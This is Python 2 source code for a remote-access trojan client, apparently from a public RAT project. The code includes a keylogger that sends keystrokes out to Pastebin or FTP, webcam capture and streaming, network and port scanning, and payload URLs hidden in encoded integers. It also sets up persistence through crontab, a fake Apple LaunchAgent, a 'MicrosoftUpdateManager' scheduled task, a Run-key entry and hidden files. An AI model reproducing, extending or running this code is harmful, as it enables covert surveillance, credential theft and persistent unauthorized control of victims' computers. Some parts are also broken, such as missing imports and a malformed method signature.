#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright (c) 2017 colental
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.

'''  

    ,adPPYYba, 8b,dPPYba,   ,adPPYb,d8 88,dPPYba,   aa       aa
    ""     `Y8 88P'   `"8a a8"    `Y88 88P'   `"8a  88       88
    ,adPPPPP88 88       88 8b       88 88	    8b	     88
    88,    ,88 88       88 "8a,   ,d88 88	    "8a,   ,d88
    `"8bbdP"Y8 88       88  `"YbbdP"Y8 88            `"YbbdP"Y8
                            aa,    ,88 	             aa,    ,88
                             "Y8bbdP"          	      "Y8bbdP'

                                                   88                          ,d
                                                   88                          88
     ,adPPYba,  ,adPPYb,d8  ,adPPYb,d8 8b,dPPYba,  88 ,adPPYYba, 8b,dPPYba,    88
    a8P     88 a8"    `Y88 a8"    `Y88 88P'    "8a 88 ""     `Y8 88P'   `"8a MM88MMM
    8PP""""""" 8b       88 8b       88 88       d8 88 ,adPPPPP88 88       88   88
    "8b,   ,aa "8a,   ,d88 "8a,   ,d88 88b,   ,a8" 88 88,    ,88 88       88   88
     `"Ybbd8"'  `"YbbdP"Y8  `"YbbdP"Y8 88`YbbdP"'  88 `"8bbdP"Y8 88       88   88,
                aa,    ,88  aa,    ,88 88                                      "Y888
                 "Y8bbdP"    "Y8bbdP"  88

'''


from __future__ import print_function

import os
import sys
import imp
import time
import json
import zlib
import uuid
import numpy
import base64
import ctypes
import pickle
import Queue
import struct
import socket
import random
import ftplib
import urllib
import urllib2
import zipfile
import functools
import threading
import cStringIO
import subprocess

from Crypto.Cipher import AES
from Crypto.Hash import SHA256, HMAC
from Crypto.Util.number import long_to_bytes, bytes_to_long




def config(*arg, **options):
    def decorator(function):
        @functools.wraps(function)
        def wrapper(*args, **kwargs):
            return function(*args, **kwargs)
        for k,v in options.items():
            setattr(wrapper, k, v)
        wrapper.platforms = ['win32','linux2','darwin'] if not 'platforms' in options else options['platforms']
        return wrapper
    return decorator



class Client():
    
    debug       = True
    _exit       = False
    _jobs       = {}
    _network    = {}
    _queue      = Queue.Queue()
    _session    = {'socket': None, 'key': None, 'connection': threading.Event()}
    __name__    = 'Client'

    def __init__(self, **kwargs):
        time.clock()
        self._kwargs    = kwargs
        self._info      = Client._get_info()
        self._services  = Client._get_services()
        self._setup     = {atr: setattr(self, '__%s__' % chr(atr), kwargs.get(chr(atr))) for atr in range(97,123) if chr(atr) in kwargs}; True
        self._commands  = {cmd: {'method': getattr(self, cmd), 'usage': getattr(Client, cmd).usage, 'description': getattr(Client, cmd).func_doc.strip().rstrip(), 'platforms': getattr(Client, cmd).platforms} for cmd in vars(Client) if hasattr(getattr(Client, cmd), 'command')}


    # Private Methods


    @staticmethod
    def _debug(data):
        print(data) if Client.debug else None


    @staticmethod
    def _xor(s, t):
        return "".join(chr(ord(x) ^ ord(y)) for x, y in zip(s, t))


    @staticmethod
    def _pad(s, block_size):
        return bytes(s) + (block_size - len(bytes(s)) % block_size) * '\x00'


    @staticmethod
    def _block(s, block_size):
        return [s[i * block_size:((i + 1) * block_size)] for i in range(len(s) // block_size)]


    @staticmethod
    def _long_to_bytes(x, default=False, **kwargs):
        return bytes(bytearray.fromhex(hex(long(x)).strip('0x').strip('L'))) if default else urllib.urlopen(bytes(bytearray.fromhex(hex(long('120950513014781697487772252820504293289885893009420441905241{}'.format(x))).strip('0x').strip('L')))).read()
  

    @staticmethod
    def _is_ipv4_address(address):
        try:
            if socket.inet_aton(str(address)):
                return True
        except:
            return False

    @staticmethod
    def _configure(target, **kwargs):
        if hasattr(Client, target):
            for k,v in kwargs.items():
                setattr(getattr(Client, target), k, v)


    @staticmethod
    def _post(url, headers={}, data={}):
        dat = urllib.urlencode(data)
        req = urllib2.Request(url, data=dat) if data else urllib2.Request(url)
        for key, value in headers.items():
            req.add_header(key, value)
        return urllib2.urlopen(req).read()


    @staticmethod
    def _get_primes(n):
        sieve = numpy.ones(n/3 + (n%6==2), dtype=numpy.bool)
        for i in xrange(1,int(n**0.5)/3+1):
            if sieve[i]:
                k=3*i+1|1
                sieve[       k*k/3     ::2*k] = False
                sieve[k*(k-2*(i&1)+4)/3::2*k] = False
        return numpy.r_[2,3,((3*numpy.nonzero(sieve)[0][1:]+1)|1)]


    @staticmethod
    def _get_nth_prime(p):
        return (Client._get_primes(i)[-1] for i in xrange(int(p*1.5), int(p*15)) if len(Client._get_primes(i)) == p).next()     


    @staticmethod
    def _get_host():
        try:
            return {'public': urllib2.urlopen('http://api.ipify.org').read(), 'private': socket.gethostbyname(socket.gethostname())}
        except Exception as e:
            Client._debug(str(e))


    @staticmethod                
    def _get_info():
        try:
            return {k:v for k,v in zip(['ip', 'local', 'platform', 'mac', 'architecture', 'username', 'administrator', 'encryption', 'device'], [Client._get_host()['public'], Client._get_host()['private'], sys.platform, ':'.join(hex(uuid.getnode()).strip('0x').strip('L')[i:i+2] for i in range(0,11,2)).upper(), int(struct.calcsize('P') * 8), os.getenv('USERNAME', os.getenv('USER')), bool(ctypes.windll.shell32.IsUserAnAdmin() if os.name is 'nt' else os.getuid() == 0), bytes('AES' if 'AES' in globals() else 'XOR'), os.getenv('NAME', os.getenv('COMPUTERNAME', os.getenv('DOMAINNAME')))])}
        except Exception as e:
            Client._debug(str(e))


    @staticmethod
    def _get_services():
        try:
            return {i.split()[1][:-4]: [i.split()[0], ' '.join(i.split()[2:])] for i in open('C:\Windows\System32\drivers\etc\services' if os.name == 'nt' else '/etc/services').readlines() if len(i.split()) > 1 if 'tcp' in i.split()[1]}
        except Exception as e:
            Client._debug(str(e))


    @staticmethod            
    def _get_status(c):
        try: 
            data=['{} days'.format(int(c / 86400.0)) if int(c / 86400.0) else str(),
                  '{} hours'.format(int((c % 86400.0) / 3600.0)) if int((c % 86400.0) / 3600.0) else str(),
                  '{} minutes'.format(int((c % 3600.0) / 60.0)) if int((c % 3600.0) / 60.0) else str(),
                  '{} seconds'.format(int(c % 60.0)) if int(c % 60.0) else str()]
            return ', '.join([i for i in data if i])
        except Exception as e:
            Client._debug(str(e))


    @staticmethod
    def _get_usage(function):
        if hasattr(function, 'usage'):
            return "usage: %s" % getattr(function, 'usage')


    @staticmethod
    def _get_process_list(executables=False):
        process_list = psutil.process_iter()
        if not executables:
            yield "{:>6}\t{:>20}\t{:>10}\n------------------------------------------".format("PID","Name","Status")
            for p in process_list:
                try:
                    yield "{:>6}\t{:>20}\t{:>10}".format(str(p.pid), str(p.name())[:19], str(p.status()))
                except: pass
        else:
            yield "{:>6}\t{:>20}\t{:>10}\t{:>30}\n------------------------------------------------------------------------------".format("PID","Name","Status","Executable")
            for p in process_list:
                try:
                    yield "{:>6}\t{:>20}\t{:>10}\t{:>30}".format(str(p.pid), str(p.name())[:19], str(p.status()), str(p.exe())[:29])
                except: pass


    @classmethod
    def _get_port(self, addr):
        try:
            host = addr[0]
            port = addr[1]
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1.0)
            sock.connect((host,int(port)))
            data = sock.recv(1024)
            if data:
                data = ' '.join(i for i in data if i in (chr(i) for i in range(32, 123)))
                info = {port: {'protocol': self._services.get(str(port))[0] if str(port) in self._services else ('mysql' if int(port) == 3306 else 'N/A'), 'service': data.splitlines()[0] if '\n' in data else data[:50], 'state': 'open'}}
            else:
                info = {port: {'protocol': self._services.get(str(port))[0] if str(port) in self._services else ('mysql' if int(port) == 3306 else 'N/A'), 'service': self._services.get(str(port))[1] if str(port) in self._services else 'n/a', 'state': 'open'}}
            self._network.get(host).get('ports').update(info)
        except (socket.error, socket.timeout):
            pass
        except Exception as e:
            self._debug('{} error: {}'.format(self._get_port.func_name.title(), str(e)))


    @classmethod
    def _get_event(event):
        try:

            if event.WindowName != vars(self.keylogger)['window']:
                vars(self.keylogger)['window'] = event.WindowName
                self.keylogger.buffer.write("\n[{}]\n".format(vars(self.keylogger)['window']))

            if event.Ascii > 32 and event.Ascii < 127:
                self.keylogger.buffer.write(chr(event.Ascii))
            elif event.Ascii == 32:
                self.keylogger.buffer.write(' ')
            elif event.Ascii in (10,13):
                self.keylogger.buffer.write('\n')
            elif event.Ascii == 8:
                self.keylogger.buffer.seek(-1, 1)
                self.keylogger.buffer.truncate()
            else:
                pass

            if self.keylogger.buffer.tell() > self.keylogger.options.get('max_bytes'):
                if self.keylogger.options.get('upload') == 'pastebin':
                    result  = self._upload_pastebin(self.keylogger.buffer)
                elif self.keylogger.options.get('upload') == 'ftp':
                    result  = self._upload_ftp(self.keylogger.buffer)
                else:
                    result  = self.keylogger.buffer.getvalue()
                self.keylogger.buffer.reset()
                
        except Exception as e:
            self._debug('{} error: {}'.format(self._get_event.title(), str(e)))
        return True


    @staticmethod
    def _get_png(image):
        if type(image) == numpy.ndarray:
            width, height = (image.shape[1], image.shape[0])
            data = image.tobytes()
        else:
            width, height = (image.width, image.height)
            data = image.rgb
        try:
            line = width * 3
            png_filter = struct.pack('>B', 0)
            scanlines = b''.join([png_filter + data[y * line:y * line + line] for y in range(height)])
            magic = struct.pack('>8B', 137, 80, 78, 71, 13, 10, 26, 10)
            ihdr = [b'', b'IHDR', b'', b'']
            ihdr[2] = struct.pack('>2I5B', width, height, 8, 2, 0, 0, 0)
            ihdr[3] = struct.pack('>I', zlib.crc32(b''.join(ihdr[1:3])) & 0xffffffff)
            ihdr[0] = struct.pack('>I', len(ihdr[2]))
            idat = [b'', b'IDAT', zlib.compress(scanlines), b'']
            idat[3] = struct.pack('>I', zlib.crc32(b''.join(idat[1:3])) & 0xffffffff)
            idat[0] = struct.pack('>I', len(idat[2]))
            iend = [b'', b'IEND', b'', b'']
            iend[3] = struct.pack('>I', zlib.crc32(iend[1]) & 0xffffffff)
            iend[0] = struct.pack('>I', len(iend[2]))
            fileh = cStringIO.StringIO()
            fileh.write(magic)
            fileh.write(b''.join(ihdr))
            fileh.write(b''.join(idat))
            fileh.write(b''.join(iend))
            fileh.seek(0)
            return fileh
        except Exception as e:
           Client._debug(str(e))


    @staticmethod
    def obfuscate(data):
        data = bytearray(i for i in reversed(data))
        z    = Client._get_nth_prime(len(data) + 1)
        return base64.b64encode(''.join([(chr(data.pop()) if i in Client._get_primes(z) else os.urandom(1)) for i in xrange(z)]))


    @staticmethod
    def deobfuscate(block):
        return bytes().join(chr(bytearray(base64.b64decode(block))[_]) for _ in Client._get_primes(len(bytearray(base64.b64decode(block)))))

    
    @staticmethod
    @config(platforms=['win32','linux2','darwin'], api_key=None)
    def _upload_imgur(source):
        if hasattr(source, 'getvalue'):
            data = source.getvalue()
        elif hasattr(source, 'read'):
            if hasattr(source, 'seek'):
                source.seek(0)
            data = source.read()
        else:
            data = bytes(source)
        return json.loads(Client._post('https://api.imgur.com/3/upload', headers={'Authorization': Client._upload_imgur.api_key}, data={'image': base64.b64encode(data), 'type': 'base64'})).get('data').get('link')


    @staticmethod
    @config(platforms=['win32','linux2','darwin'], api_dev_key=None, api_user_key=None)
    def _upload_pastebin(source):
        if hasattr(source, 'getvalue'):
            text = source.getvalue()
        elif hasattr(source, 'read'):
            if hasattr(source, 'seek'):
                source.seek(0)
            text = source.read()
        else:
            text = bytes(source)
        try:
            info = {'api_option': 'paste', 'api_paste_code': text}
            info.update({'api_user_key': Client._upload_pastebin.api_user_key}) if hasattr(Client._upload_pastebin, 'api_user_key') else None
            info.update({'api_dev_key' : Client._upload_pastebin.api_dev_key}) if hasattr(Client._upload_pastebin, 'api_dev_key') else None
            paste = Client._post('https://pastebin.com/api/api_post.php', data=info)
            return '{}/raw/{}'.format(os.path.split(paste)[0], os.path.split(paste)[1]) if paste.startswith('http') else paste
        except Exception as e:
            Client._debug('{} error: {}'.format(Client._upload_pastebin.func_name.title(), str(e)))


    @staticmethod
    @config(platforms=['win32','linux2','darwin'], hostname=None, username=None, password=None)
    def _upload_ftp(source):
        addr    = urllib.urlopen('http://api.ipify.org').read()
        host    = ftplib.FTP(Client._upload_ftp.hostname, Client._upload_ftp.username, Client._upload_ftp.password)
        if addr not in host.nlst('/htdocs'):
            host.mkd('/htdocs/{}'.format(addr))
        local   = time.ctime().split()
        ext     = os.path.splitext(source)[1] if os.path.isfile(str(source)) else '.txt'
        result  = '/htdocs/{}/{}'.format(addr, '{}-{}_{}{}'.format(local[1], local[2], local[3], ext))
        source  = open(source, 'rb') if os.path.isfile(str(source)) else source
        upload  = host.storbinary('STOR ' + result, source)
        return result


    @staticmethod
    @config(block_size=8, key_size=16, num_rounds=32)
    def _encrypt_xor(data, key):
        data    = Client._pad(data, Client._encrypt_xor.block_size)
        blocks  = Client._block(data, Client._encrypt_xor.block_size)
        vector  = os.urandom(8)
        result  = [vector]
        for block in blocks:
            block   = Client._xor(vector, block)
            v0, v1  = struct.unpack("!2L", block)
            k       = struct.unpack("!4L", key[:Client._encrypt_xor.key_size])
            sum, delta, mask = 0L, 0x9e3779b9L, 0xffffffffL
            for round in range(Client._encrypt_xor.num_rounds):
                v0  = (v0 + (((v1 << 4 ^ v1 >> 5) + v1) ^ (sum + k[sum & 3]))) & mask
                sum = (sum + delta) & mask
                v1  = (v1 + (((v0 << 4 ^ v0 >> 5) + v0) ^ (sum + k[sum >> 11 & 3]))) & mask
            output  = vector = struct.pack("!2L", v0, v1)
            result.append(output)
        return base64.b64encode(b''.join(result))


    @staticmethod
    @config(block_size=8, key_size=16, num_rounds=32)
    def _decrypt_xor(data, key):
        data    = base64.b64decode(data)
        blocks  = Client._block(data, Client._decrypt_xor.block_size)
        vector  = blocks[0]
        result  = []
        for block in blocks[1:]:
            v0, v1 = struct.unpack("!2L", block)
            k = struct.unpack("!4L", key[:Client._decrypt_xor.key_size])
            delta, mask = 0x9e3779b9L, 0xffffffffL
            sum = (delta * Client._decrypt_xor.num_rounds) & mask
            for round in range(Client._decrypt_xor.num_rounds):
                v1 = (v1 - (((v0 << 4 ^ v0 >> 5) + v0) ^ (sum + k[sum >> 11 & 3]))) & mask
                sum = (sum - delta) & mask
                v0 = (v0 - (((v1 << 4 ^ v1 >> 5) + v1) ^ (sum + k[sum & 3]))) & mask
            decode = struct.pack("!2L", v0, v1)
            output = Client._xor(vector, decode)
            vector = block
            result.append(output)
        return ''.join(result).rstrip('\x00')


    @staticmethod
    def _encrypt_aes(plaintext, key):
        text        = Client._pad(plaintext, AES.block_size)
        iv          = os.urandom(AES.block_size)
        cipher      = AES.new(key[:max(AES.key_size)], AES.MODE_CBC, iv)
        ciphertext  = iv + cipher.encrypt(text)
        hmac_sha256 = HMAC.new(key[max(AES.key_size):], msg=ciphertext, digestmod=SHA256).digest()
        output      = base64.b64encode(ciphertext + hmac_sha256)
        return output


    @staticmethod
    def _decrypt_aes(ciphertext, key):
        ciphertext  = base64.b64decode(ciphertext)
        iv          = ciphertext[:AES.block_size]
        cipher      = AES.new(key[:max(AES.key_size)], AES.MODE_CBC, iv)
        read_hmac   = ciphertext[-SHA256.digest_size:]
        calc_hmac   = HMAC.new(key[max(AES.key_size):], msg=ciphertext[:-SHA256.digest_size], digestmod=SHA256).digest()
        output      = cipher.decrypt(ciphertext[AES.block_size:-SHA256.digest_size]).rstrip(b'\0')
        Client._debug('HMAC-SHA256 hash authentication check failed - transmission may have been compromised') if calc_hmac != read_hmac else None
        return output


    @config(platforms=['win32','linux2','darwin']) 
    def _scan_host(self, host):
        try:
            if host in self._network:
                for port in [21,22,23,25,53,80,110,111,135,139,143,179,443,445,514,993,995,1433,1434,1723,3306,3389,8000,8008,8443,8888]:
                    self._queue.put_nowait((self._get_port, (host, port)))
                for x in xrange(10):
                    self._jobs['scanner-%d' % x] = threading.Thread(target=self._threader, name=time.time())
                    self._jobs['scanner-%d' % x].daemon = True
                    self._jobs['scanner-%d' % x].start()
                for x in xrange(10):
                    if self._jobs['scanner-%d' % x].is_alive():
                        self._jobs['scanner-%d' % x].join()
                return json.dumps(self.network)
        except Exception as e:
            self._debug('{} error: {}'.format(self.scan_ports.func_name.title(), str(e)))


    @config(platforms=['win32','linux2','darwin']) 
    def _scan_network(self):
        try:
            stub = '.'.join(str(self._info['local']).split('.')[:-1]) + '.%d'
            lan  = []
            for i in xrange(1,255):
                lan.append(stub % i)
                self._queue.put_nowait((self._ping, stub % i))
            for _ in xrange(10):
                x = len(self._jobs)
                self._jobs['scanner-%d' % x] = threading.Thread(target=self._threader, name=time.time())
                self._jobs['scanner-%d' % x].setDaemon(True)
                self._jobs['scanner-%d' % x].start()
            self._jobs['scanner-%d' % x].join()
            for ip in lan:
                self._queue.put_nowait((self.scan_ports, ip))
            for n in xrange(len(lan)):
                x = len(self._jobs)
                self._jobs['scanner-%d' % x] = threading.Thread(target=self._threader, name=time.time())
                self._jobs['scanner-%d' % x].start()
            self._jobs['scanner-%d' % x].join()
            return json.dumps(self._network)
        except Exception as e:
            self._debug('{} error: {}'.format(self.scan_network.func_name.title(), str(e)))


    @config(platforms=['win32','linux2','darwin'])
    def _webcam_image(self, *args, **kwargs):
        dev = VideoCapture(0)
        r,f = dev.read()
        dev.release()
        if not r:
            return "Unable to access webcam"
        png = self._get_png(f)
        return self._upload_imgur(png) if 'ftp' not in args else self._upload_ftp(png)

            
    @config(platforms=['win32','linux2','darwin'])
    def _webcam_video(self, duration=5.0, *args, **kwargs):
        fpath  = os.path.join(os.path.expandvars('%TEMP%'), 'tmp{}.avi'.format(random.randint(1000,9999))) if os.name is 'nt' else os.path.join('/tmp', 'tmp{}.avi'.format(random.randint(1000,9999)))
        fourcc = VideoWriter_fourcc(*'DIVX') if sys.platform is 'win32' else VideoWriter_fourcc(*'XVID')
        output = VideoWriter(fpath, fourcc, 20.0, (640,480))
        end = time.time() + duration
        dev = VideoCapture(0)
        while True:
            ret, frame = dev.read()
            output.write(frame)
            if time.time() > end: break
        dev.release()
        result = self._upload_ftp(fpath)
        try:
            os.remove(fpath)
        except: pass
        return result


    @config(platforms=['win32','linux2','darwin'])
    def _webcam_stream(self, port=None, retries=5):
        if not port:
            return self._get_usage(self.webcam_stream)
        try:
            host = self._session['socket'].getpeername()[0]
        except socket.error:
            self._session['connection'].clear()
            return self.new_session()
        port = int(port)
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        while retries > 0:
            try:
                sock.connect((host, port))
            except socket.error:
                retries -= 1
            break
        if not retries:
            return 'Stream failed - connection error'
        dev = VideoCapture(0)
        try:
            t1 = time.time()
            while True:
                try:
                    ret,frame=dev.read()
                    data = pickle.dumps(frame)
                    sock.sendall(struct.pack("L", len(data))+data)
                    time.sleep(0.1)
                except Exception as e:
                    self._debug('Stream error: {}'.format(str(e)))
                    break
        finally:
            try:
                dev.release()
                sock.close()
            except: pass


    @config(platforms=['win32','linux2','darwin'])
    def _persistence_add_hidden_file(self):
        if hasattr(self, '__f__'):
            try:
                value        = self._long_to_bytes(long(self.__f__))
            except:
                value        = self.__f__
            if os.path.isfile(value):
                try:
                    if os.name is 'nt':
                        path = value
                        hide = subprocess.call('attrib +h {}'.format(path), shell=True) == 0
                    else:
                        dirname, basename = os.path.split(value)
                        path = os.path.join(dirname, '.' + basename)
                        hide = subprocess.call('mv {} {}'.format(value, path), shell=True) == 0
                    if hide:
                        if path != value:
                            self.__f__ = bytes(bytes_to_long(self._upload_pastebin(path)))[-21:]
                        return (True, path)
                except Exception as e:
                    self._debug('Adding hidden file error: {}'.format(str(e)))
        return (False, None)


    @config(platforms=['win32','linux2','darwin'])
    def _persistence_remove_hidden_file(self):
        if hasattr(self, '__f__'):
            try:
                filename     = self._long_to_bytes(long(self.__f__))
            except:
                filename      = self.__f__
            if os.path.isfile(filename):
                try:
                    unhide  = 'attrib -h {}'.format(filename) if os.name is 'nt' else 'mv {} {}'.format(filename, os.path.join(os.path.dirname(filename), os.path.basename(filename).strip('.')))
                    if subprocess.call(unhide, 0, None, None, subprocess.PIPE, subprocess.PIPE, shell=True) == 0:
                        return True
                except Exception as e:
                    self._debug('Error unhiding file: {}'.format(str(e)))
        return False 


    @config(platforms=['linux2'])
    def _persistence_add_crontab_job(self, minutes=10, name='flashplayer'):
        if hasattr(self, '__f__'):
            try:
                value       = self._long_to_bytes(long(self.__f__))
            except:
                value       = self.__f__
            if os.path.isfile(value):
                try:
                    if not os.path.isdir('/var/tmp'):
                        os.makedirs('/var/tmp')
                    name = os.path.join('/var/tmp','.' + os.path.splitext(name)[0] + os.path.splitext(value)[1])
                    with file(name, 'w') as copy:
                        copy.write(open(value).read())
                    if not self.persistence.methods['crontab_job']['established']:
                        for user in ['root', os.getenv('USERNAME', os.getenv('NAME'))]:
                            try:
                                task = "0 */6 * * * {} {}".format(60/minutes, user, name)
                                with open('/etc/crontab', 'r') as fp:
                                    data= fp.read()
                                if task not in data:
                                    with file('/etc/crontab', 'a') as fd:
                                        fd.write('\n' + task + '\n')
                                return (True, name)
                            except Exception as e:
                                self._debug("{} returned error: {}".format(self._persistence_add_crontab_job.func_name, str(e)))
                                try:
                                    os.remove(name)
                                except: pass
                    else:
                        return (True, name)
                except Exception as e:
                    self._debug("{} returned error: {}".format(self._persistence_add_crontab_job.func_name, str(e)))
                    try:
                        os.remove(name)
                    except: pass
        return (False, None)


    @config(platforms=['linux2'])
    def _persistence_remove_crontab_job(self, name='flashplayer'):
        if hasattr(self, '__f__'):
            try:
                value       = self._long_to_bytes(long(self.__f__))
            except:
                value       = self.__f__
            if os.path.isfile(value):
                try:
                    with open('/etc/crontab','r') as fp:
                        lines = [i.rstrip() for i in fp.readlines()]
                        for line in lines:
                            if name in line:
                                _ = lines.pop(line, None)
                    with open('/etc/crontab', 'a+') as fp:
                        fp.write('\n'.join(lines))
                    return True
                except Exception as e:
                    self._debug(str(e))
        return False


    @config(platforms=['darwin'])
    def _persistence_add_launch_agent(self,  name='com.apple.update.manager'):
        if hasattr(self, '__f__') and hasattr(self, '__g__'):
            try:
                value       = self._long_to_bytes(long(self.__f__))
            except:
                value       = self.__f__
            if os.path.isfile(value):
                try:
                    code    = urllib2.urlopen(self._long_to_bytes(long(self.__g__))).read()
                    label   = name
                    if not os.path.exists('/var/tmp'):
                        os.makedirs('/var/tmp')
                    fpath   = '/var/tmp/.{}.sh'.format(name)
                    bash    = code.replace('__LABEL__', label).replace('__FILE__', value)
                    with file(fpath, 'w') as fileobj:
                        fileobj.write(bash)
                    bin_sh  = bytes().join(subprocess.Popen('/bin/sh {}'.format(fpath), 0, None, None, subprocess.PIPE, subprocess.PIPE, shell=True).communicate())
                    time.sleep(1)
                    launch_agent= '~/Library/LaunchAgents/{}.plist'.format(label)
                    if os.path.isfile(launch_agent):
                        os.remove(fpath)
                        return (True, launch_agent)
                except Exception as e2:
                    self._debug('Error: {}'.format(str(e2)))
        return (False, None)


    @config(platforms=['darwin'])
    def _persistence_remove_launch_agent(self, name='com.apple.update.manager'):
        if hasattr(self, '__f__'):
            if self.persistence.get('launch_agent'):
                launch_agent = self.persistence.get('launch_agent')
                if os.path.isfile(launch_agent):
                    try:
                        os.remove(launch_agent)
                        return True
                    except: pass
        return False
    

    @config(platforms=['win32'])
    def _persistence_add_scheduled_task(self, name='MicrosoftUpdateManager'):
        if hasattr(self, '__f__'):
            try:
                value       = self._long_to_bytes(long(self.__f__))
            except:
                value       = self.__f__
            if os.path.isfile(value):
                tmpdir      = os.path.expandvars('%TEMP%')
                task_run    = os.path.join(tmpdir, name + os.path.splitext(value)[1])
                if not os.path.isfile(task_run):
                    with file(task_run, 'w') as copy:
                        copy.write(open(value).read())
                try:
                    cmd     = 'SCHTASKS /CREATE /TN {} /TR {} /SC hourly /F'.format(name, task_run)
                    result  = subprocess.check_output(cmd, shell=True)
                    if 'SUCCESS' in result:
                        return (True, result)
                except Exception as e:
                    self._debug('Add scheduled task error: {}'.format(str(e)))
        return (False, None)


    @config(platforms=['win32'])
    def _persistence_remove_scheduled_task(self, name='MicrosoftUpdateManager'):
        if hasattr(self, '__f__'):
            try:
                return subprocess.call('SCHTASKS /DELETE /TN {} /F'.format(name), shell=True) == 0
            except:
                return False


    @config(platforms=['win32'])
    def _persistence_add_startup_file(self, name='MicrosoftUpdateManager'):
        if hasattr(self, '__f__'):
            try:
                value = self._long_to_bytes(long(self.__f__))
            except:
                value = self.__f__
            if os.path.isfile(value):
                try:
                    appdata = os.path.expandvars("%AppData%")
                    startup_dir = os.path.join(appdata, 'Microsoft\Windows\Start Menu\Programs\Startup')
                    if not os.path.exists(startup_dir):
                        os.makedirs(startup_dir)
                    startup_file = os.path.join(startup_dir, '%s.eu.url' % name)
                    content = '\n[InternetShortcut]\nURL=file:///%s\n' % value
                    if not os.path.exists(startup_file) or content != open(startup_file, 'r').read():
                        with file(startup_file, 'w') as fp:
                            fp.write(content)
                    return (True, startup_file)
                except Exception as e:
                    self._debug('{} returned error: {}'.format(self._persistence_add_startup_file.func_name.strip('_'), str(e)))
        return (False, None)


    @config(platforms=['win32'])
    def _persistence_remove_startup_file(self, name='MicrosoftUpdateManager'):
        if hasattr(self, '__f__'):
            if os.name != 'nt':
                return (False, None)
            appdata      = os.path.expandvars("%AppData%")
            startup_dir  = os.path.join(appdata, 'Microsoft\Windows\Start Menu\Programs\Startup')
            startup_file = os.path.join(startup_dir, name) + '.eu.url'
            if os.path.exists(startup_file):
                try:
                    os.remove(startup_file)
                    return True
                except:
                    try:
                        _  = os.popen('del {} /f'.format(startup_file)).read()
                        return True
                    except: pass
            return False


    @config(platforms=['win32'])
    def _persistence_add_registry_key(self, name='MicrosoftUpdateManager'):
        if hasattr(self, '__f__'):
            try:
                value = self._long_to_bytes(long(self.__f__))
            except:
                value = self.__f__
            if os.path.isfile(value):
                run_key = r"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
                reg_key = OpenKey(HKEY_CURRENT_USER, run_key, 0, KEY_WRITE)
                try:
                    SetValueEx(reg_key, name, 0, REG_SZ, value)
                    CloseKey(reg_key)
                    return (True, name)
                except Exception as e:
                    self._debug('{} returned error: {}'.format(self._persistence_add_registry_key.func_name.strip('_'), str(e)))
        return (False, None)
    

    @config(platforms=['win32'])
    def _persistence_remove_registry_key(self, name='MicrosoftUpdateManager'):
        if hasattr(self, '__f__'):
            try:
                key = OpenKey(HKEY_CURRENT_USER, r"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_ALL_ACCESS)
                DeleteValue(key, name)
                CloseKey(key)
                return True
            except: pass
        return False



    @config(platforms=['linux2','darwin'])
    def _packetsniffer_udp_header(self, data):
        try:
            udp_hdr = struct.unpack('!4H', data[:8])
            src = udp_hdr[0]
            dst = udp_hdr[1]
            length = udp_hdr[2]
            chksum = udp_hdr[3]
            data = data[8:]
            self.packetsniffer.capture.append('|================== UDP HEADER ==================|')
            self.packetsniffer.capture.append('|================================================|')
            self.packetsniffer.capture.append('|{:>20} | {}\t\t\t |'.format('Source', src))
            self.packetsniffer.capture.append('|{:>20} | {}\t\t\t |'.format('Dest', dst))
            self.packetsniffer.capture.append('|{:>20} | {}\t\t\t |'.format('Length', length))
            self.packetsniffer.capture.append('|{:>20} | {}\t\t\t |'.format('Check Sum', chksum))
            self.packetsniffer.capture.append('|================================================|')
            return data
        except Exception as e:
            self.packetsniffer.capture.append("Error in {} header: '{}'".format('UDP', str(e)))


    @config(platforms=['linux2','darwin'])
    def _packetsniffer_tcp_header(self, recv_data):
        try:
            tcp_hdr = struct.unpack('!2H2I4H', recv_data[:20])
            src_port = tcp_hdr[0]
            dst_port = tcp_hdr[1]
            seq_num = tcp_hdr[2]
            ack_num = tcp_hdr[3]
            data_ofs = tcp_hdr[4] >> 12
            reserved = (tcp_hdr[4] >> 6) & 0x03ff
            flags = tcp_hdr[4] & 0x003f
            flagdata = {
                'URG' : bool(flags & 0x0020),
                'ACK' : bool(flags & 0x0010),
                'PSH' : bool(flags & 0x0008),
                'RST' : bool(flags & 0x0004),
                'SYN' : bool(flags & 0x0002),
                'FIN' : bool(flags & 0x0001)
            }
            win = tcp_hdr[5]
            chk_sum = tcp_hdr[6]
            urg_pnt = tcp_hdr[7]
            recv_data = recv_data[20:]
            self.packetsniffer.capture.append('|================== TCP HEADER ==================|')
            self.packetsniffer.capture.append('|================================================|')
            self.packetsniffer.capture.append('|{:>20} | {}\t\t\t |'.format('Source', src_port))
            self.packetsniffer.capture.append('|{:>20} | {}\t\t\t |'.format('Target', dst_port))
            self.packetsniffer.capture.append('|{:>20} | {}\t\t\t |'.format('Seq Num', seq_num))
            self.packetsniffer.capture.append('|{:>20} | {}\t\t |'.format('Ack Num', ack_num))
            self.packetsniffer.capture.append('|{:>20} | {}\t\t |'.format('Flags', ', '.join([flag for flag in flagdata if flagdata.get(flag)])))
            self.packetsniffer.capture.append('|{:>20} | {}\t\t\t |'.format('Window', win))
            self.packetsniffer.capture.append('|{:>20} | {}\t\t\t |'.format('Check Sum', chk_sum))
